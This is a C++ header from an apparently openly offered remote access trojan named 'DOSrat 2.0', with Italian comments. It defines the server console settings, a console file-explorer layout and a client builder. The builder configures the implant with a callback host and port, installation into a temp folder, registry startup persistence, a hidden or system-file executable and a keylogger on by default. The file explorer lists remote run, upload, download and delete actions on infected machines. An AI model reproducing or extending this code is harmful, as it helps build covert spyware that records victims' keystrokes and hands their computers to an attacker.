﻿#pragma once

// Classe per la gestione dei settaggi del Server
class SettaggiServer
{
	private:
		DirUtils du;
		SettingsFile sf;

		// Struttura contenente i colori della console
		struct COLORI
		{
			short Conferma = 10;
			short Negativo = 12;
			short Avviso = 14;
		};

		void InitSettings()
		{
			if (!sf.CheckSetting("Port"))
				sf.SetSetting("Port", to_string(Porta));

			if (!sf.CheckSetting("CheckUpdate"))
				sf.SetSetting("CheckUpdate", (VerificaAggiornamenti) ? "true" : "false");

			if (!sf.CheckSetting("AutoUpdate"))
				sf.SetSetting("AutoUpdate", (AutoAggiornamento) ? "true" : "false");

			if (!sf.CheckSetting("ColorOk"))
				sf.SetSetting("ColorOk", to_string(Colori.Conferma));

			if (!sf.CheckSetting("ColorError"))
				sf.SetSetting("ColorError", to_string(Colori.Negativo));

			if (!sf.CheckSetting("ColorWarning"))
				sf.SetSetting("ColorWarning", to_string(Colori.Avviso));

			if (!sf.CheckSetting("WindowSizeX"))
				sf.SetSetting("WindowSizeX", to_string(DimensioniFinestra.X));

			if (!sf.CheckSetting("WindowSizeY"))
				sf.SetSetting("WindowSizeY", to_string(DimensioniFinestra.Y));
		}

	public:
		int Porta = 6969;
		bool VerificaAggiornamenti = true;
		bool AutoAggiornamento = true;
		COLORI Colori;
		COORD DimensioniFinestra{800, 600};
		
		// Costruttore
		SettaggiServer()
		{
			sf.SetFileName(du.GetModuleFilePath() + "settings.ini");
			InitSettings();
		}

		// Popola i settaggi ottenendoli dal relativo file
		bool GetSettings()
		{
			if (!sf.CheckFile())
				return false;

			Porta = stoi(sf.GetSetting("Port"));
			VerificaAggiornamenti = (sf.GetSetting("CheckUpdate") == "true");
			AutoAggiornamento = (sf.GetSetting("AutoUpdate") == "true");
			Colori.Conferma = (short)stoi(sf.GetSetting("ColorOk"));
			Colori.Negativo = (short)stoi(sf.GetSetting("ColorError"));
			Colori.Avviso = (short)stoi(sf.GetSetting("ColorWarning"));
			DimensioniFinestra.X = (short)stoi(sf.GetSetting("WindowSizeX"));
			DimensioniFinestra.Y = (short)stoi(sf.GetSetting("WindowSizeY"));

			return true;
		}

		// Scrive i settaggi su file
		bool SetSettings()
		{
			if (!sf.CheckFile())
				return false;

			sf.SetSetting("Port", to_string(Porta));
			sf.SetSetting("CheckUpdate", (VerificaAggiornamenti) ? "true" : "false");
			sf.SetSetting("AutoUpdate", (AutoAggiornamento) ? "true" : "false");
			sf.SetSetting("ColorOk", to_string(Colori.Conferma));
			sf.SetSetting("ColorError", to_string(Colori.Negativo));
			sf.SetSetting("ColorWarning", to_string(Colori.Avviso));
			sf.SetSetting("WindowSizeX", to_string(DimensioniFinestra.X));
			sf.SetSetting("WindowSizeY", to_string(DimensioniFinestra.Y));

			return true;
		}

		// Mostra in CLI i settaggi
		int ShowSettings()
		{
			CLInterface cli;
			VectSettings MenuImpostazioni;

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[0].Escape = true;
			MenuImpostazioni[0].Name = "Salva ed Esci";

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[1].Name = "Porta";
			MenuImpostazioni[1].Value = to_string(Porta);
			MenuImpostazioni[1].Escape = true;

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[2].Name = "Verifica Aggiornamenti";
			MenuImpostazioni[2].CheckValue = "true";
			MenuImpostazioni[2].Value = (VerificaAggiornamenti) ? "true" : "false";

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[3].Name = "Aggiornamenti Automatici";
			MenuImpostazioni[3].CheckValue = "true";
			MenuImpostazioni[3].Value = (AutoAggiornamento) ? "true" : "false";

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[4].Name = "Imposta Colori";
			MenuImpostazioni[4].Escape = true;

			MenuImpostazioni.push_back(SettingsMenu());
			MenuImpostazioni[5].Name = "Dimensioni Finestra";
			MenuImpostazioni[5].Value = to_string(DimensioniFinestra.X);
			MenuImpostazioni[5].SecValue = to_string(DimensioniFinestra.Y);
			MenuImpostazioni[5].Escape = true;

			return cli.MenuSettings(MenuImpostazioni);
		}
};

// Classe per la gestione dei settaggi del Client
class SettaggiClient
{
private:
	DirUtils du;
	SettingsFile sf;

	void InitSettings()
	{
		if (!sf.CheckSetting("Host"))
			sf.SetSetting("Host", Host);

		if (!sf.CheckSetting("Port"))
			sf.SetSetting("Port", to_string(Porta));

		if (!sf.CheckSetting("InstallPath"))
			sf.SetSetting("InstallPath", InstallPath);

		if (!sf.CheckSetting("ExeName"))
			sf.SetSetting("ExeName", ExeName);

		if (!sf.CheckSetting("RegStartup"))
			sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");

		if (!sf.CheckSetting("HideExe"))
			sf.SetSetting("HideExe", (HideExe) ? "true" : "false");

		if (!sf.CheckSetting("SystemFile"))
			sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");

		if (!sf.CheckSetting("KeyLogger"))
			sf.SetSetting("KeyLogger", (KeyLogger) ? "true" : "false");
	}

public:
	string Host = "127.0.0.1";
	int Porta = 6969;
	string InstallPath = "C:\\Users\\<User>\\AppData\\Local\\Temp";
	string ExeName = "Client.exe";
	bool RegStartup = true;
	bool HideExe = true;
	bool SystemFile = false;
	bool KeyLogger = true;

	// Costruttore
	SettaggiClient()
	{
		sf.SetFileName(du.GetModuleFilePath() + "c-settings.ini");
		InitSettings();
	}

	// Popola i settaggi ottenendoli dal relativo file
	bool GetSettings()
	{
		if (!sf.CheckFile())
			return false;

		Host = sf.GetSetting("Host");
		Porta = stoi(sf.GetSetting("Port"));
		InstallPath = sf.GetSetting("InstallPath");
		ExeName = sf.GetSetting("ExeName");
		RegStartup = (sf.GetSetting("RegStartup") == "true");
		HideExe = (sf.GetSetting("HideExe") == "true");
		SystemFile = (sf.GetSetting("SystemFile") == "true");
		KeyLogger = (sf.GetSetting("KeyLogger") == "true");

		return true;
	}

	// Restituisce i settaggi per il client in stringa
	string DumpSettingsForBuild()
	{
		string Dump = sf.Buff;

		Dump.erase(Dump.find("[HideExe]"), Dump.find("\\;", Dump.find("[HideExe]")) + 2 - Dump.find("[HideExe]"));
		Dump.erase(Dump.find("[SystemFile]"), Dump.find("\\;", Dump.find("[SystemFile]")) + 2 - Dump.find("[SystemFile]"));

		return Dump;
	}

	// Scrive i settaggi su file
	bool SetSettings()
	{
		if (!sf.CheckFile())
			return false;

		sf.SetSetting("Host", Host);
		sf.SetSetting("Port", to_string(Porta));
		sf.SetSetting("InstallPath", InstallPath);
		sf.SetSetting("ExeName", ExeName);
		sf.SetSetting("RegStartup", (RegStartup) ? "true" : "false");
		sf.SetSetting("HideExe", (HideExe) ? "true" : "false");
		sf.SetSetting("SystemFile", (SystemFile) ? "true" : "false");
		sf.SetSetting("KeyLogger", (KeyLogger) ? "true" : "false");

		return true;
	}

	// Mostra in CLI i settaggi
	int ShowSettings()
	{
		CLInterface cli;
		VectSettings MenuImpostazioni;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[0].Name = "Esci";
		MenuImpostazioni[0].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[1].Name = "Host";
		MenuImpostazioni[1].Value = Host;
		MenuImpostazioni[1].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[2].Name = "Porta";
		MenuImpostazioni[2].Value = to_string(Porta);
		MenuImpostazioni[2].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[3].Name = "Percorso";
		MenuImpostazioni[3].Value = InstallPath;
		MenuImpostazioni[3].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[4].Name = "Nome File";
		MenuImpostazioni[4].Value = ExeName;
		MenuImpostazioni[4].Escape = true;

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[5].Name = "Avvia con Windows";
		MenuImpostazioni[5].Value = (RegStartup) ? "true" : "false";
		MenuImpostazioni[5].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[6].Name = "File Nascosto";
		MenuImpostazioni[6].Value = (HideExe) ? "true" : "false";
		MenuImpostazioni[6].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[7].Name = "File di Sistema";
		MenuImpostazioni[7].Value = (SystemFile) ? "true" : "false";
		MenuImpostazioni[7].CheckValue = "true";

		MenuImpostazioni.push_back(SettingsMenu());
		MenuImpostazioni[8].Name = "Crea Client";
		MenuImpostazioni[8].Escape = true;

		return cli.MenuSettings(MenuImpostazioni);
	}
};

// Utility per i Clients, principalmente per aggiornare il titolo
class ClientUtils
{
public:
	int ClientCount = 0;
	enum TitleType { Menu, Off, Loading };

private:
	SettaggiServer* settings;
	TitleType CurrentTitleType = Menu;

	void AggiornaCount()
	{
		ClientCount = 0;

		for (int i = 0; i < MAX_CLIENTS; i++)
			if (Clients[i].IsConnected)
				ClientCount++;
	}

public:

	ClientUtils(SettaggiServer& settaggi)
	{
		settings = &settaggi;
	}

	void AggiornaTitolo(TitleType tipo)
	{
		AggiornaCount();

		ConsoleUtils cu;
		string Sep = " - ";
		string Start = "DOSrat 2.0 By Criper98";
		string Clients = "Clients[" + to_string(ClientCount) + "/" + to_string(MAX_CLIENTS) + "]";
		string Porta = "Port[" + to_string(settings->Porta) + "]";
		
		string StatusAscolto = "In ascolto...";
		string StatusOffline = "OFFLINE...";
		string StatusLoading = "Caricamento...";

		switch (tipo)
		{
			case Menu:
				cu.ConsoleTitle(Start + Sep + Porta + " " + Clients + Sep + StatusAscolto);
				break;
				
			case Off:
				cu.ConsoleTitle(Start + Sep + Porta + Sep + StatusOffline);
				break;
				
			case Loading:
				cu.ConsoleTitle(Start + Sep + StatusLoading);
				break;

			default:
				cu.ConsoleTitle(Start + Sep + Porta + " " + Clients);
				break;
		}

		CurrentTitleType = tipo;
	}

	void AggiornaTitolo()
	{
		AggiornaTitolo(CurrentTitleType);
	}
};

class CliFileExplorer
{
private:
	ConsoleUtils cu;
	TextColor tc;
	VectString FileExpLayout;
	VectString FileExpHelp;
	VectString FileExpInfo;
	int HelpSize = 0;
	int MinXsize = 0;
	int FileNameSize = 0;
	int FileNameRows = 0;
	short ConsoleSizeX = cu.GetConsoleSize().X;
	short ConsoleSizeY = cu.GetConsoleSize().Y - 1;
	COORD HelpCutPos;
	COORD HelpCopyPos;
	COORD FilePos;
	COORD InfoPos;
	COORD FinalPos;

	struct FileExplorerStruct
	{
		bool Type; // true file; false dir;
		string Name;
		string Path;
		long long int FileSize = 0;
		string LastEdit;
	};

public:
	vector<FileExplorerStruct> Files;

	CliFileExplorer()
	{
		FileExpLayout.push_back("File Explorer");
		FileExpLayout.push_back("Help");
		FileExpLayout.push_back("File Info");

		FileExpHelp.push_back("UP/DOWN: Navigate");
		FileExpHelp.push_back("ENTER: Run/Navigate");
		FileExpHelp.push_back("BACKSPACE: Up Folder");
		FileExpHelp.push_back("DEL: Delete File/Folder");
		FileExpHelp.push_back("R: Rename File/Folder");
		FileExpHelp.push_back("U: Upload");
		FileExpHelp.push_back("D: Download");
		FileExpHelp.push_back("X: Cut");
		FileExpHelp.push_back("C: Copy");
		FileExpHelp.push_back("V: Paste");
		FileExpHelp.push_back("Z: Zip/Unzip");
		FileExpHelp.push_back("F5: Refresh");
		FileExpHelp.push_back("ESC: Exit");

		FileExpInfo.push_back("Name: ");
		FileExpInfo.push_back("Path: ");
		FileExpInfo.push_back("Size: <size> byte");
		FileExpInfo.push_back("Last Edit: ");
	}

	bool PrintLayout()
	{
		for (int i = 0; i < FileExpHelp.size(); i++)
			if (HelpSize < FileExpHelp[i].size())
				HelpSize = FileExpHelp[i].size();

		MinXsize = 5 + FileExpLayout[0].size() + HelpSize;

		if (ConsoleSizeY < FileExpHelp.size() + 4 + FileExpInfo.size() || ConsoleSizeX < MinXsize)
			return false; // oppure forza le dimensioni necessarie

		system("cls");

		FileNameSize = ConsoleSizeX - (4 + HelpSize);
		FileNameRows = ConsoleSizeY - (4 + FileExpInfo.size());


		// ┌─File Explorer───────────────┐┌─Help──────────────────┐
		tc.SetColor(tc.Blue);
		cout << char(218) << char(196);
		tc.SetColor(tc.Default);
		cout << FileExpLayout[0];
		tc.SetColor(tc.Blue);
		for (int i = 0; i < FileNameSize - 1 - FileExpLayout[0].size(); i++)
			cout << char(196);
		cout << char(191) << char(218) << char(196);
		tc.SetColor(tc.Default);
		cout << FileExpLayout[1];
		tc.SetColor(tc.Blue);
		for (int i = 0; i < HelpSize - FileExpLayout[1].size() - 1; i++)
			cout << char(196);
		cout << char(191) << endl;

		FilePos = { (short)(ConsoleSizeX + 1), ConsoleSizeY };


		// │../                          ││↕: Up/Down             │
		for (int i = 0; i < FileNameRows; i++)
		{
			cout << char(179);
			for (int j = 0; j < FileNameSize; j++)
				cout << " ";
			if (i == 7)
				HelpCutPos = { (short)(ConsoleSizeX + 2), ConsoleSizeY };
			if (i == 8)
				HelpCopyPos = { (short)(ConsoleSizeX + 2), ConsoleSizeY };
			cout << char(179) << char(179);
			if (i < FileExpHelp.size())
			{
				tc.SetColor(tc.Default);
				cout << FileExpHelp[i];
				tc.SetColor(tc.Blue);
				for (int j = 0; j < HelpSize - FileExpHelp[i].size(); j++)
					cout << " ";
			}
			else
				for (int j = 0; j < HelpSize; j++)
					cout << " ";
			cout << char(179) << endl;
		}


		// └─────────────────────────────┘└───────────────────────┘
		cout << char(192);
		for (int i = 0; i < FileNameSize; i++)
			cout << char(196);
		cout << char(217) << char(192);
		for (int i = 0; i < HelpSize; i++)
			cout << char(196);
		cout << char(217) << endl;


		// ┌─File Info────────────────────────────────────────────┐
		cout << char(218) << char(196);
		tc.SetColor(tc.Default);
		cout << FileExpLayout[2];
		tc.SetColor(tc.Blue);
		for (int i = 0; i < FileNameSize + HelpSize + 1 - FileExpLayout[2].size(); i++)
			cout << char(196);
		cout << char(191) << endl;


		// │Name: A                                               │
		for (int i = 0; i < FileExpInfo.size(); i++)
		{
			if (i == 0)
				InfoPos = { (short)(ConsoleSizeX + 1), ConsoleSizeY };
			cout << char(179);
			tc.SetColor(tc.Default);
			cout << FileExpInfo[i];
			tc.SetColor(tc.Blue);
			for (int j = 0; j < FileNameSize + HelpSize + 2 - FileExpInfo[i].size(); j++)
				cout << " ";
			cout << char(179) << endl;
		}


		// └──────────────────────────────────────────────────────┘
		cout << char(192);
		for (int i = 0; i < FileNameSize + HelpSize + 2; i++)
			cout << char(196);
		cout << char(217) << endl;

		FinalPos = cu.GetConsoleSize();
		tc.SetColor(tc.Default);

		return true;
	}

	void FilesParse(json j)
	{
		Files.clear();

		for (int i = 0; i < j["Files"].size(); i++)
		{
			FileExplorerStruct tmp = FileExplorerStruct();

			tmp.Type = j["Files"][i]["Type"];
			tmp.Name = j["Files"][i]["Name"];
			tmp.Path = j["Files"][i]["Path"];
			tmp.FileSize = j["Files"][i]["Size"];
			tmp.LastEdit = j["Files"][i]["LastEdit"];

			Files.push_back(tmp);
		}
	}
};